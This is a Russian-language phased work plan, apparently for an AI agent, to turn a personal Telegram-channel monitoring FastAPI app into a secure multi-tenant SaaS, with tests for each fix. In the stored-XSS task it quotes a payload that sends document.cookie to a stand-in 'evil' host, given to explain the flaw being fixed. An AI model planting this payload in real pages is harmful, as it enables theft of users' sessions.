# Teleton: план работ для агента-исполнителя

> Документ написан для ИИ-агента или джуниор-разработчика, который будет выполнять работу.
> Читается сверху вниз. Фазы выполняются строго по порядку — каждая опирается на предыдущую.

---

## 0. Что происходит и зачем

`FastAPI/server.py` — 1994 строки, написанные быстро и работающие. Это персональный локальный
инструмент: мониторинг Telegram-каналов через Telethon (MTProto, от лица живого аккаунта),
дедупликация постов, анализ через OpenRouter LLM, доставка в n8n-вебхук и в Telegram-бота.
Фронтенд — один файл `static/index.html` на 3975 строк ванильного JS.

**Задача — превратить его в мульти-тенант SaaS, который можно выставить в публичный интернет.**

Стек не меняется: остаёмся на FastAPI + Telethon. Причина — в Ruby нет зрелой библиотеки MTProto,
а переписывать рабочий код ради смены языка бессмысленно. Из Rails-шаблона `Ruby/` переносим
**устройство сервисных модулей** (аутентификация, сессии в БД, сброс пароля, админка), а не код.

**Почему безопасность здесь не гигиена, а суть задачи.** В мульти-тенанте каждый пользователь
подключает свой Telegram-аккаунт, и на сервере оседает его MTProto-сессия. Такая сессия — не пароль:
её нельзя сбросить удалённо, и она даёт полное чтение переписки. База с сессиями сотни
пользователей — это возможность угнать сто живых аккаунтов одним запросом. Всё, что описано ниже
про шифрование, изоляцию и закрытые по умолчанию эндпоинты, следует из этого одного факта.

**Деплой — Railway.** Там managed Postgres, несколько сервисов в одном проекте и приватная сеть.
Modal.com не подходит: он про serverless-батчи, а MTProto держит долгоживущее TCP-соединение.
Trigger.dev — оркестратор задач для TypeScript, не хостинг.

### Что сломано прямо сейчас (полный список — в разделе 9)

Три вещи делают текущий деплой небезопасным немедленно:

1. `.dockerignore` не исключает `.env`, `*.session`, `storage.db`, `key.md`, а `Dockerfile`
   делает `COPY . .`. В образ запекается живой auth-key Telegram-аккаунта и база с ключами.
2. Аутентификации нет вообще — ни одного `Depends`, ни одного middleware. Все ~40 эндпоинтов
   открыты, включая `GET /dialogs` (весь список чатов аккаунта).
3. `GET /api/openrouter` и `GET /api/telegram-forward` рядом с маской отдают сырой ключ и токен.

---

## 1. Как работать: цикл CDD

**CDD = Contract-Driven Development.** Каждая задача начинается с падающего теста, который
описывает контракт, и заканчивается зелёным тестом. Порядок не декоративный.

```
1. Красный тест   → tests/test_NN_<имя>.py, запустить, УБЕДИТЬСЯ ЧТО ПАДАЕТ
2. Реализация     → минимальный код до зелёного
3. Проверка       → pytest -q && ruff check . && mypy app/
4. Коммит         → одна задача = один коммит
```

**Тест, написанный после реализации, проверяет то, что вы сделали, а не то, что требовалось.**
Это не формальность: половина задач ниже — про безопасность, и там разница между «код работает»
и «код делает ровно то, что заявлено» — это и есть уязвимость.

**Красный тест обязан падать по правильной причине.** Тест, падающий с `ImportError`, потому что
модуля ещё нет, — не красный тест, а отсутствующий. Сначала создайте пустой модуль с заглушкой,
убедитесь, что тест падает на `assert`, и только потом пишите реализацию.

**Два уровня тестов.** Статический работает где угодно: разбирает исходники, конфиги, схему.
Поведенческий требует живого Postgres. Поведенческий при отсутствии среды обязан честно писать
`pytest.skip`, а не выдумывать результат.

### Команды

```bash
pytest -q                          # все тесты
pytest tests/test_12_auth.py -q    # один файл
ruff check . && ruff format --check .
mypy app/
bandit -r app/ -ll                 # поиск небезопасных паттернов
pip-audit                          # уязвимости в зависимостях
alembic upgrade head               # применить миграции
```

---

## 2. Целевая структура файлов

Сейчас всё лежит в одном `server.py`. К концу работ должно быть так:

```
FastAPI/
├── AGENTS.md                      ← правила работы (Фаза 0, задача 0.6)
├── PROGRESS.md                    ← журнал проходов (Фаза 0, задача 0.7)
├── app/
│   ├── main.py                    # сборка FastAPI, middleware, роутеры
│   ├── config.py                  # pydantic-settings, единственная точка чтения ENV
│   ├── db.py                      # async engine, sessionmaker, get_db()
│   ├── deps.py                    # require_user, require_admin, current_user
│   ├── models/                    # SQLAlchemy: user, session, telegram_account,
│   │                              #   monitor, sent_message, feed_item, log, integration, job
│   ├── security/
│   │   ├── passwords.py           # bcrypt
│   │   ├── sessions.py            # cookie + сессии в БД
│   │   ├── crypto.py              # Fernet: шифрование секретов
│   │   ├── csrf.py                # double-submit token
│   │   └── ratelimit.py
│   ├── api/                       # роутеры: auth, profile, admin, telegram, monitors,
│   │                              #   feed, messages, integrations, logs, cleanup
│   ├── services/
│   │   ├── tg_pool.py             # пул Telethon-клиентов
│   │   ├── fetcher.py             # чтение сообщений из канала
│   │   ├── dedup.py               # атомарная дедупликация
│   │   ├── llm.py                 # OpenRouter
│   │   ├── dispatch.py            # AI → Telegram-бот → n8n → лента
│   │   ├── webhook.py             # отправка вебхука с защитой от SSRF
│   │   └── mailer.py              # письма сброса пароля
│   └── worker.py                  # планировщик, отдельный процесс
├── alembic/versions/
├── scripts/migrate_sqlite_to_pg.py
├── static/
│   ├── index.html                 # разметка без логики
│   ├── css/
│   └── js/                        # feed.js, channels.js, messages.js, integration.js,
│                                  #   logs.js, auth.js, render.js
├── tests/
│   ├── conftest.py
│   └── test_NN_*.py
├── requirements.txt
├── Dockerfile
├── .dockerignore
└── railway.json
```

`server.py` в конце работ удаляется. Не редактируйте его после Фазы 1 — переносите код в модули.

---

## 3. ФАЗА 0 — Экстренное закрытие дыр

**Делается первой, до всего остального.** Если сервис где-то развёрнут — это правки на сегодня.
Фаза не требует Postgres и не ломает работающее приложение.

---

### Задача 0.1 — `.dockerignore` не пускает секреты в образ

**Проблема.** `.dockerignore` содержит `.venv/`, `__pycache__`, `*.session-journal`, но **не** содержит
`.env`, `*.session`, `storage.db`, `key.md`. `Dockerfile:16` делает `COPY . .`. Результат: в образ
попадают реальный `TELEGRAM_API_HASH`, файл `personal_account.session` (живой auth-key аккаунта)
и `storage.db` на 622 КБ с ключом OpenRouter и токеном бота.

**Красный тест** — `tests/test_00_dockerignore.py`:

```python
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
REQUIRED = {".env", "*.session", "storage.db", "key.md", "Ruby/", "exports/", ".git/"}

def test_dockerignore_covers_all_secrets():
    patterns = {
        line.strip()
        for line in (ROOT / ".dockerignore").read_text().splitlines()
        if line.strip() and not line.startswith("#")
    }
    missing = REQUIRED - patterns
    assert not missing, f"В .dockerignore нет: {sorted(missing)}"
```

**Реализация.** Дописать недостающие строки в `.dockerignore`.

**Готово когда:** тест зелёный, и `docker build -t teleton . && docker run --rm teleton ls -la /app`
не показывает ни `.env`, ни `*.session`, ни `storage.db`.

---

### Задача 0.2 — Перевыпуск скомпрометированных секретов

**Это не код, это действие оператора.** Всё, что было в образе или в git-истории, считается
утёкшим навсегда. Удаление файла ничего не отменяет.

Перевыпустить:
- `TELEGRAM_API_ID` / `TELEGRAM_API_HASH` — на my.telegram.org.
- Ключ OpenRouter — отозвать старый в панели OpenRouter, создать новый.
- Токен Telegram-бота — `/revoke` у @BotFather, затем `/token`.
- Сессию MTProto — выйти из всех сторонних сессий в самом Telegram
  (Настройки → Устройства → Завершить все другие сеансы).

**Готово когда:** старые значения нигде не работают. Проверить `git log --all -p -- .env`
и `git log --all --diff-filter=A --name-only | grep -E '\.env|\.session|storage\.db'` — если
секреты когда-либо попадали в историю, нужен `git filter-repo` и force-push.

---

### Задача 0.3 — Ключи не возвращаются наружу

**Проблема.** `server.py:1695` рядом с `api_key_masked` отдаёт сырой `api_key`;
`server.py:1747` — сырой `bot_token`. Один GET-запрос без авторизации отдаёт оба.

**Красный тест** — `tests/test_01_no_secret_leak.py`. Статический уровень: пройтись по AST
`server.py` (позже — по `app/api/integrations.py`) и убедиться, что ни один `return`-словарь
не содержит ключей `api_key`, `bot_token`, `session_string`, `password_hash`. Проще и надёжнее —
проверять фактические ответы:

```python
FORBIDDEN_KEYS = {"api_key", "bot_token", "session_string", "password_hash",
                  "openrouter_api_key", "telegram_bot_token"}

def _walk(obj, path=""):
    """Рекурсивно обходит JSON и возвращает пути до запрещённых ключей."""
    found = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in FORBIDDEN_KEYS:
                found.append(f"{path}.{k}")
            found += _walk(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            found += _walk(v, f"{path}[{i}]")
    return found

def test_integrations_endpoints_never_return_raw_secrets(client):
    for url in ("/api/openrouter", "/api/telegram-forward"):
        leaked = _walk(client.get(url).json())
        assert not leaked, f"{url} отдаёт секреты: {leaked}"
```

**Реализация.** Из ответов убрать `api_key` и `bot_token`, оставить `*_masked` и `has_*`.
Фронтенд в `static/index.html` правится соответственно: он и так использует маску для
отображения, а сырое значение только подставлял в поле ввода — вместо этого поле остаётся
пустым с плейсхолдером `••••••••`.

**Осторожно:** в `POST /api/openrouter` есть логика «не перезаписывать ключ, если пришла маска»
(`server.py:1713` — `if req.api_key and not req.api_key.startswith("******")`). Её нужно сохранить,
иначе сохранение формы затрёт ключ пустой строкой.

---

### Задача 0.4 — Устранить stored XSS

**Проблема.** В SPA есть корректный `escapeHtml` (`index.html:3127`), и `formatTelegramText`
им пользуется. Но три места интерполируют данные в `innerHTML` **без** него:

| Строка | Что не экранируется | Кто это контролирует |
|---|---|---|
| `index.html:2704` | `m.chat_title` в списке каналов | владелец канала — любой человек в интернете |
| `index.html:3757` | `d.name` в модалке диалогов | любой, кто написал оператору в личку |
| `index.html:3719` | `log.chat_title`, `log.event_type` в журнале | то же самое |

Канал с названием `<img src=x onerror=fetch('//evil/'+document.cookie)>` исполняет JS в панели.
Сейчас красть нечего — сессий нет. После Фазы 2 это станет угоном сессии оператора.

**Красный тест** — `tests/test_02_xss.py`, статический уровень: регуляркой найти все
`innerHTML = \`` в `static/js/**/*.js` и `static/index.html` и убедиться, что внутри
шаблонной строки каждая `${...}`-подстановка обёрнута в `esc(` или является литералом/числом.

```python
import re, pathlib

TEMPLATE_INTERP = re.compile(r"\$\{([^}]+)\}")
ALLOWED = re.compile(r"^\s*(esc\(|escapeHtml\(|formatTelegramText\(|[\d.]+$|['\"])")

def test_no_unescaped_interpolation_in_innerhtml():
    violations = []
    for f in pathlib.Path("static").rglob("*.js"):
        # ... найти блоки innerHTML = `...`, проверить каждую ${}
        ...
    assert not violations, "Неэкранированная подстановка в innerHTML:\n" + "\n".join(violations)
```

**Реализация.** Завести короткий алиас `const esc = escapeHtml;` и обернуть все подстановки
пользовательских данных. Числа (`m.chat_id`, `log.messages_count`) экранировать не обязательно,
но проще обернуть всё — тест тогда однозначен.

**Готово когда:** канал с названием `<img src=x onerror=alert(1)>` отображается как текст,
alert не срабатывает ни на вкладке «Каналы», ни в журнале, ни в модалке диалогов.

---

### Задача 0.5 — Убрать мусор из репозитория

- `FastAPI/Ruby/` — вторая копия Rails-шаблона на 2 МБ внутри Python-проекта. Удалить.
- `Teleton/storage.db` в корне — пустой файл на 0 байт при живом `FastAPI/storage.db` на 622 КБ.
  Удалить пустой, иначе однажды приложение запишет данные не туда.
- `FastAPI/monitors.json.bak` — остаток старой миграции. Удалить.

**Тест** — `tests/test_03_repo_hygiene.py`: перечисленных путей не существует.

---

### Задача 0.6 — Написать `AGENTS.md`

Создать `FastAPI/AGENTS.md` с содержимым из раздела 8 этого документа.

---

### Задача 0.7 — Завести `PROGRESS.md`

Создать `FastAPI/PROGRESS.md` — журнал проходов. Формат описан в `AGENTS.md`, §7.
Начальная запись: что сделано в Фазе 0.

---

## 4. ФАЗА 1 — Фундамент данных

Цель: уйти с SQLite на Postgres, получить нормальные миграции и единую точку чтения конфига.
После этой фазы приложение ещё работает по-старому (без логина), но на новой базе.

---

### Задача 1.1 — Зависимости

Добавить в `requirements.txt` с зафиксированными нижними границами:

```
sqlalchemy[asyncio]>=2.0.30
asyncpg>=0.29.0
alembic>=1.13.0
pydantic-settings>=2.2.0
passlib[bcrypt]>=1.7.4
itsdangerous>=2.2.0
cryptography>=42.0.0
slowapi>=0.1.9
```

Dev-зависимости — отдельный `requirements-dev.txt`: `pytest`, `pytest-asyncio`, `httpx`,
`ruff`, `mypy`, `bandit`, `pip-audit`.

**Тест** — `tests/test_10_deps.py`: все перечисленные пакеты импортируются.

---

### Задача 1.2 — `app/config.py`, единая точка чтения ENV

**Проблема, которую это решает.** Сейчас `POST /api/settings` **перезаписывает `.env` целиком**
(`server.py:343`), оставляя в нём 2–3 строки и стирая остальное. На Railway файловая система
эфемерна, поэтому настройка молча теряется при каждом редеплое.

**Красный тест** — `tests/test_11_config.py`:

```python
def test_settings_read_from_env(monkeypatch):
    monkeypatch.setenv("DATABASE_URL", "postgresql+asyncpg://u:p@h/db")
    monkeypatch.setenv("APP_ENCRYPTION_KEY", "x" * 44)
    from app.config import Settings
    s = Settings()
    assert s.database_url.startswith("postgresql+asyncpg://")

def test_app_never_writes_env_file():
    """update_env_file больше не существует ни в одном модуле."""
    import pathlib, re
    for f in pathlib.Path("app").rglob("*.py"):
        src = f.read_text()
        assert "update_env_file" not in src
        assert not re.search(r"open\(\s*ENV_FILE", src)
```

**Реализация.** `pydantic-settings` с полями: `database_url`, `app_encryption_key`,
`secret_key` (для подписи cookie), `telegram_api_id`, `telegram_api_hash`,
`smtp_*` / `resend_api_key`, `app_base_url`, `environment`.
Эндпоинт `POST /api/settings` удаляется полностью — ключи MTProto теперь только из ENV.

---

### Задача 1.3 — Модели SQLAlchemy

Девять таблиц. Ключевое отличие от текущей схемы — `user_id` везде.

| Таблица | Поля | Заметки |
|---|---|---|
| `users` | `id`, `email` (uniq, lower), `password_hash` (nullable — вход только через Google), `timezone`, `is_admin`, `created_at`, `updated_at` | по образцу `Ruby/db/schema.rb:168` |
| `sessions` | `id` (UUID), `user_id` FK, `ip_address`, `user_agent`, `created_at`, `last_seen_at`, `expires_at` | по образцу `Ruby/app/models/session.rb` |
| `telegram_accounts` | `id`, `user_id` FK uniq, `phone`, `session_string_encrypted`, `tg_user_id`, `tg_username`, `status`, `created_at` | заменяет файл `.session` |
| `tg_auth_attempts` | `id`, `user_id` FK, `phone`, `phone_code_hash`, `expires_at` | заменяет глобальный `auth_state` |
| `monitors` | всё из текущей схемы + `user_id` FK | `id` меняем с TEXT-UUID на BIGINT + отдельная колонка `public_id` |
| `sent_messages` | всё из текущей + `user_id` FK; `UNIQUE(user_id, chat_id, message_id)` | уникальность теперь в разрезе тенанта |
| `feed_items` | бывшая `analysis_feed` + `user_id`; `photo_base64` **выносится** | см. задачу 5.4 |
| `logs` | всё из текущей + `user_id` FK | |
| `integrations` | бывшая `integrations_config`, но без `CHECK (id = 1)`; `user_id` FK uniq; ключи в зашифрованных колонках | |
| `jobs` | `id`, `user_id`, `kind`, `payload_json`, `status`, `created_at`, `started_at`, `finished_at`, `error` | ручной запуск из UI |

**Красный тест** — `tests/test_12_models.py`: у каждой модели из списка есть атрибут `user_id`,
он `nullable=False` и на нём есть индекс.

```python
TENANT_TABLES = ["monitors", "sent_messages", "feed_items", "logs",
                 "integrations", "telegram_accounts", "jobs"]

def test_every_tenant_table_has_indexed_user_id():
    from app.models import Base
    for name in TENANT_TABLES:
        t = Base.metadata.tables[name]
        assert "user_id" in t.c, f"{name}: нет user_id"
        assert not t.c.user_id.nullable, f"{name}: user_id допускает NULL"
        assert any("user_id" in i.columns for i in t.indexes), f"{name}: user_id без индекса"
```

---

### Задача 1.4 — Alembic

**Проблема, которую это решает.** Сейчас схема мигрируется шестью блоками
`try: cur.execute("ALTER TABLE ...") except Exception: pass` (`server.py:144-170`).
Ошибка проглатывается — вы никогда не узнаете, что колонка не добавилась.

**Красный тест** — `tests/test_13_migrations.py`:

```python
def test_no_adhoc_ddl_in_application_code():
    import pathlib, re
    bad = re.compile(r"(ALTER TABLE|CREATE TABLE)", re.I)
    for f in pathlib.Path("app").rglob("*.py"):
        assert not bad.search(f.read_text()), f"DDL в коде приложения: {f}"

@pytest.mark.asyncio
async def test_migrations_produce_expected_schema(pg_url):
    """alembic upgrade head на чистой БД даёт схему, совпадающую с моделями."""
    ...
```

**Реализация.** `alembic init alembic`, настроить на async-движок, сгенерировать начальную
ревизию `alembic revision --autogenerate -m "initial schema"`. **Проверить сгенерированный файл
глазами** — autogenerate регулярно пропускает индексы и `server_default`.

---

### Задача 1.5 — Скрипт миграции данных из SQLite

**Что переносим:** 5 каналов, 192 сообщения, 8 записей ленты, 308 логов, 1 строка настроек.

**Самое важное здесь — `sent_messages`.** Если не перенести историю отправленных ID, первый же
опрос после переезда отправит в n8n все старые посты как новые. Пользователь получит 192 дубля.

**Красный тест** — `tests/test_14_data_migration.py`:

```python
@pytest.mark.asyncio
async def test_migration_preserves_counts_and_dedup(tmp_sqlite, pg_session):
    from scripts.migrate_sqlite_to_pg import migrate
    user = await create_user(pg_session, "owner@example.com")
    stats = await migrate(sqlite_path=tmp_sqlite, session=pg_session, user_id=user.id)

    assert stats == {"monitors": 5, "sent_messages": 192,
                     "feed_items": 8, "logs": 308, "integrations": 1}

    # Дедупликация действительно работает после переезда
    fake = [{"id": known_id, "text": "старый пост"}]
    assert await filter_new(pg_session, user.id, chat_id, fake) == []
```

**Реализация** — `scripts/migrate_sqlite_to_pg.py`. Идемпотентный: повторный запуск не создаёт
дублей (`ON CONFLICT DO NOTHING`). Все записи привязываются к пользователю, переданному
параметром `--user-email`. Секреты из `integrations_config` при переносе **шифруются** (задача 3.4).

---

## 5. ФАЗА 2 — Аутентификация

Паттерны берутся из Rails-шаблона. Читать перед началом:
`Ruby/app/controllers/concerns/authentication.rb`, `sessions_controller.rb`,
`registrations_controller.rb`, `passwords_controller.rb`, `admin/base_controller.rb`.

---

### Задача 2.1 — Хеширование паролей

`app/security/passwords.py`: `hash_password(plain) -> str`, `verify_password(plain, hash) -> bool`
на `passlib` с bcrypt.

**Красный тест** — `tests/test_20_passwords.py`: хеш не равен паролю, начинается с `$2b$`,
проверка проходит для верного и не проходит для неверного, два хеша одного пароля различаются
(соль работает).

---

### Задача 2.2 — Сессии в БД + подписанная cookie

Это прямой порт `Ruby/app/controllers/concerns/authentication.rb`.

`app/security/sessions.py`:
- `create_session(db, user, ip, user_agent) -> Session` — создаёт строку, возвращает объект.
- `resolve_session(db, cookie_value) -> Session | None` — проверяет подпись, ищет в БД,
  проверяет `expires_at`, обновляет `last_seen_at`.
- `destroy_session(db, session_id)`.
- `set_session_cookie(response, session_id)` — `httponly=True`, `secure=True` (в проде),
  `samesite="lax"`, `max_age` = 30 дней.

**Почему сессии в БД, а не JWT.** JWT нельзя отозвать до истечения. Сессия в БД отзывается
удалением строки — это нужно и для «выйти на всех устройствах», и для блокировки аккаунта
админом. Это же решение принято в Rails-шаблоне.

**Красный тест** — `tests/test_21_sessions.py`:
- Подделанная cookie (изменён один символ) → `resolve_session` возвращает `None`.
- Валидная cookie, но строка удалена из БД → `None`.
- Истёкшая сессия → `None`.
- Cookie в ответе имеет флаги `HttpOnly`, `SameSite=Lax`, и `Secure` при `environment=production`.

---

### Задача 2.3 — Закрыто по умолчанию

**Главная задача фазы.** В Rails-шаблоне `before_action :require_authentication` висит на
`ApplicationController`, то есть на всём приложении, а публичные экшены объявляют opt-out явно
(`allow_unauthenticated_access`). Порядок именно такой: забыть закрыть эндпоинт невозможно,
можно только забыть открыть — а это заметно сразу.

**Красный тест** — `tests/test_22_auth_required.py`. Тест перебирает **все** маршруты приложения
и требует, чтобы каждый, кроме явного белого списка, отвечал 401 анониму:

```python
PUBLIC_PATHS = {"/health", "/auth/login", "/auth/signup", "/auth/password-reset",
                "/auth/password-reset/confirm", "/auth/google", "/", "/static"}

def test_every_route_requires_auth_unless_whitelisted(app, anon_client):
    for route in app.routes:
        path = getattr(route, "path", None)
        if not path or any(path.startswith(p) for p in PUBLIC_PATHS):
            continue
        for method in (getattr(route, "methods", None) or {"GET"}):
            r = anon_client.request(method, path.replace("{id}", "1")
                                              .replace("{monitor_id}", "1"))
            assert r.status_code == 401, f"{method} {path} доступен анониму ({r.status_code})"
```

**Реализация.** `app/deps.py`:

```python
async def require_user(request: Request, db = Depends(get_db)) -> User:
    raw = request.cookies.get(SESSION_COOKIE)
    session = await resolve_session(db, raw) if raw else None
    if session is None:
        raise HTTPException(401, "Требуется вход")
    return session.user
```

Вешается на роутер целиком: `APIRouter(dependencies=[Depends(require_user)])`.
Публичные роутеры создаются отдельно и перечисляются в белом списке теста.

---

### Задача 2.4 — Регистрация, вход, выход

| Эндпоинт | Поведение | Источник паттерна |
|---|---|---|
| `POST /auth/signup` | email + password + timezone браузера; создаёт пользователя и сразу сессию | `registrations_controller.rb` |
| `POST /auth/login` | проверка пароля, новая сессия | `sessions_controller.rb` |
| `POST /auth/logout` | удаление строки сессии + очистка cookie | там же |
| `GET /auth/me` | текущий пользователь или 401 | — |

**Красный тест** — `tests/test_23_registration.py`:
- Регистрация с существующим email → 422, и ответ **не отличается** формулировкой от других
  ошибок валидации настолько, чтобы по нему перебирать пользователей.
- Пароль короче 8 символов → 422.
- После логина `GET /auth/me` отдаёт того же пользователя.
- После логаута та же cookie даёт 401.

---

### Задача 2.5 — Сброс пароля

Порт `Ruby/app/controllers/passwords_controller.rb`. Токен — `itsdangerous.URLSafeTimedSerializer`
с солью `password-reset` и `max_age=3600`.

**Критично:** ответ на `POST /auth/password-reset` **одинаков** независимо от того, существует ли
email. Иначе эндпоинт превращается в перечислитель пользователей. В Rails-шаблоне это сделано
именно так — сравните формулировку в `passwords_controller.rb:create`.

**Красный тест** — `tests/test_24_password_reset.py`:

```python
def test_reset_response_identical_for_known_and_unknown_email(client, existing_user):
    a = client.post("/auth/password-reset", json={"email": existing_user.email})
    b = client.post("/auth/password-reset", json={"email": "nobody@example.com"})
    assert a.status_code == b.status_code
    assert a.json() == b.json()

def test_token_expires(client, frozen_time):
    ...  # токен старше часа отклоняется

def test_token_single_use(client, user):
    ...  # второй раз тот же токен не работает
```

Одноразовость токена: в подпись включается текущий `password_hash` пользователя — после смены
пароля хеш меняется, и старый токен перестаёт проверяться. Это тот же приём, что в Rails
`generates_token_for`.

---

### Задача 2.6 — CSRF

Cookie-аутентификация без CSRF-защиты означает, что сторонний сайт может выполнить действие
от имени залогиненного пользователя.

`app/security/csrf.py` — double-submit token: при создании сессии выдаётся вторая cookie
`csrf_token` (не `HttpOnly`, чтобы JS мог её прочитать), фронтенд шлёт её значение в заголовке
`X-CSRF-Token`, middleware сверяет.

**Красный тест** — `tests/test_25_csrf.py`: любой не-GET-запрос без заголовка → 403;
с неверным заголовком → 403; с верным → проходит. Тест перебирает все не-GET-маршруты,
чтобы нельзя было забыть один.

---

### Задача 2.7 — Rate limiting

В Rails-шаблоне: `rate_limit to: 10, within: 3.minutes` на логине и регистрации.

Защитить `slowapi`:

| Эндпоинт | Лимит | Почему |
|---|---|---|
| `POST /auth/login` | 10 / 3 мин на IP | брутфорс |
| `POST /auth/signup` | 10 / 3 мин на IP | спам-регистрации |
| `POST /auth/password-reset` | 5 / час на IP+email | спам писем |
| `POST /api/telegram/send-code` | **3 / час на пользователя** | **самое важное** |

Про последний. Telegram отвечает на спам кодов `FloodWaitError` и может ограничить аккаунт
пользователя на дни. Это не «защита сервера» — это защита аккаунта клиента от вашего же сервиса.

**Красный тест** — `tests/test_26_ratelimit.py`: 11-я попытка логина за 3 минуты возвращает 429;
4-й запрос кода Telegram за час — 429.

---

### Задача 2.8 — Админка

Порт `Ruby/app/controllers/admin/base_controller.rb`: зависимость `require_admin`,
роутер `/api/admin/*`, эндпоинты `GET /api/admin/users`, `GET /api/admin/users/{id}`.

**Красный тест:** обычный пользователь получает 403 на каждом `/api/admin/*`;
админ — 200; аноним — 401.

---

### Задача 2.9 — Почта

`app/services/mailer.py`. В проде — Resend или Postmark по ключу из ENV.
В разработке — писать письмо в `tmp/mail/<timestamp>.html` и логировать путь
(аналог `letter_opener` из Rails-шаблона). Никаких реальных отправок из dev.

---

## 6. ФАЗА 3 — Мульти-тенант

Самая ответственная фаза. Здесь появляется возможность утечки данных между пользователями.

---

### Задача 3.1 — Скоуп по пользователю на уровне слоя доступа

**Не полагайтесь на то, что каждый запрос помнит про `where user_id ==`.** Один забытый фильтр —
и пользователь A читает ленту пользователя B. Заведите слой, в котором забыть невозможно:

```python
class TenantRepo:
    def __init__(self, db: AsyncSession, user_id: int):
        self.db, self.user_id = db, user_id

    def query(self, model):
        return select(model).where(model.user_id == self.user_id)
```

Все роутеры получают `repo: TenantRepo = Depends(get_tenant_repo)` и ходят только через него.

**Красный тест** — `tests/test_30_tenant_isolation.py`. Это самый важный тест проекта.
Он должен перебирать **все** ресурсные эндпоинты автоматически, а не по списку:

```python
@pytest.mark.asyncio
async def test_user_a_cannot_see_or_touch_user_b_resources(client_a, client_b, seeded):
    """A создаёт ресурсы, B не видит их в списках и получает 404 по прямым ID."""
    for path in ("/api/monitors", "/api/feed", "/api/messages", "/api/logs"):
        assert client_b.get(path).json()["items"] == []

    for path, method in [(f"/api/monitors/{seeded.monitor_id}", "PATCH"),
                         (f"/api/monitors/{seeded.monitor_id}", "DELETE"),
                         (f"/api/monitors/{seeded.monitor_id}/run", "POST"),
                         (f"/api/feed/{seeded.feed_id}", "DELETE"),
                         (f"/api/feed/{seeded.feed_id}/reanalyze", "POST")]:
        r = client_b.request(method, path)
        assert r.status_code == 404, f"{method} {path} доступен чужому пользователю"
```

**404, а не 403.** 403 подтверждает существование объекта — это утечка информации.

---

### Задача 3.2 — Telegram-сессии в БД, зашифрованные

Заменяем файл `personal_account.session` на `StringSession` в колонке.

```python
from telethon.sessions import StringSession
client = TelegramClient(StringSession(decrypted), api_id, api_hash)
# после логина:
encrypted = encrypt(client.session.save())
```

**Почему это правильно.** Файл `.session` на Railway живёт до первого редеплоя — ФС эфемерна.
Строка в Postgres переживает всё. Плюс нечего запечь в Docker-образ (проблема из задачи 0.1
становится невозможной по построению).

**Красный тест** — `tests/test_31_tg_session_storage.py`:

```python
def test_session_string_is_encrypted_at_rest(db, user):
    save_tg_session(db, user.id, "1BQANOTEuMTA4LjU2LjE4NAG7...")
    raw = db.execute(text(
        "SELECT session_string_encrypted FROM telegram_accounts WHERE user_id = :u"
    ), {"u": user.id}).scalar()
    assert "1BQANOTE" not in raw          # не лежит открытым текстом
    assert decrypt(raw).startswith("1BQANOTE")

def test_session_string_never_appears_in_any_api_response(client_with_tg_account):
    for path in ("/api/telegram/status", "/api/settings", "/auth/me", "/health"):
        assert "session" not in client_with_tg_account.get(path).text.lower() \
               or "session_string" not in client_with_tg_account.get(path).json()
```

---

### Задача 3.3 — `auth_state` в БД вместо глобальной переменной

**Проблема.** `server.py:39` — модульный словарь `auth_state = {"phone": ..., "phone_code_hash": ...}`.
Два одновременных входа перетирают друг друга; параллельный запрос может завершить чужой логин.
В мульти-тенанте это прямая дыра: пользователь B заканчивает вход, начатый пользователем A,
и получает его аккаунт.

**Реализация.** Таблица `tg_auth_attempts`: `user_id`, `phone`, `phone_code_hash`, `expires_at`
(TTL 10 минут). `POST /api/telegram/sign-in` берёт `phone_code_hash` строго из строки текущего
пользователя, а не из тела запроса.

**Красный тест** — `tests/test_32_auth_state.py`: два параллельных `send-code` от разных
пользователей не мешают друг другу; `sign-in` с `phone_code_hash` чужого пользователя → 400.

---

### Задача 3.4 — Шифрование секретов

`app/security/crypto.py` на `cryptography.fernet`. Ключ — `APP_ENCRYPTION_KEY` из ENV,
в БД не хранится никогда.

Шифруются: `telegram_accounts.session_string`, `integrations.openrouter_api_key`,
`integrations.telegram_bot_token`.

**Красный тест** — `tests/test_33_crypto.py`: шифротекст не содержит открытого текста,
дешифровка возвращает исходное, дешифровка чужим ключом бросает `InvalidToken`,
приложение **отказывается стартовать** при отсутствующем или коротком `APP_ENCRYPTION_KEY`.

Последнее важно: без явного отказа кто-нибудь однажды запустит прод с ключом по умолчанию.

---

### Задача 3.5 — Пул Telethon-клиентов

`app/services/tg_pool.py`. Ключ — `user_id`. Требования:

- Лимит одновременно живых клиентов (напр. 20), вытеснение по LRU.
- Отключение по простою (напр. 10 минут без запросов).
- `asyncio.Lock` на каждого пользователя: два опроса одного аккаунта не идут параллельно.
- Обработка `FloodWaitError`: не ретраить сразу, записать `retry_after` в монитор и пропустить
  цикл. Telethon сам умеет ждать, но при `seconds > 300` это вешает воркер — ловите и отступайте.

**Красный тест** — `tests/test_34_tg_pool.py` с подменённым Telethon-клиентом:
пул не превышает лимит; повторный запрос того же пользователя переиспользует клиент;
идлящий клиент отключается; `FloodWaitError` не приводит к падению цикла.

---

## 7. ФАЗА 4 — Планировщик и надёжность

---

### Задача 4.1 — Воркер как отдельный процесс

**Проблема.** `server.py:37` — глобальный синглтон `client`. Второй uvicorn-воркер означает два
процесса на одном auth-key; Telegram отвечает `AUTH_KEY_DUPLICATED` и может убить сессию.
Поэтому сейчас приложение принципиально одно-процессное.

**Решение — разделение ответственности:**

| Процесс | Что делает | С Telethon |
|---|---|---|
| `web` (uvicorn) | HTTP, логин пользователей, вход в Telegram | поднимает **короткоживущий** клиент только на время авторизации и сразу отключает |
| `worker` | опрос каналов, диспетчеризация, автоочистка | единственный владелец долгоживущих клиентов |

Оба — из одного Docker-образа, разные команды. `app/worker.py` — цикл из
`background_monitor_worker` (`server.py:520`), но обходящий мониторы всех пользователей.

**Красный тест** — `tests/test_40_worker.py`: `app/main.py` не импортирует `tg_pool` для
долгоживущих клиентов; воркер стартует и корректно завершается по `SIGTERM`, отключив клиентов.

---

### Задача 4.2 — Атомарная дедупликация

**Проблема.** `filter_and_save_new_messages` (`server.py:363`) делает `SELECT`, потом `INSERT`.
Между ними — окно. Ручной запуск и тик планировщика по одному каналу одновременно → оба
считают пост новым → в n8n уходит два одинаковых вебхука. `INSERT OR IGNORE` спасает строку
в базе, но `new_messages` уже посчитан и отправлен.

**Реализация.** Одним запросом, дедупликация решается базой:

```sql
INSERT INTO sent_messages (user_id, chat_id, message_id, ...)
VALUES ...
ON CONFLICT (user_id, chat_id, message_id) DO NOTHING
RETURNING message_id
```

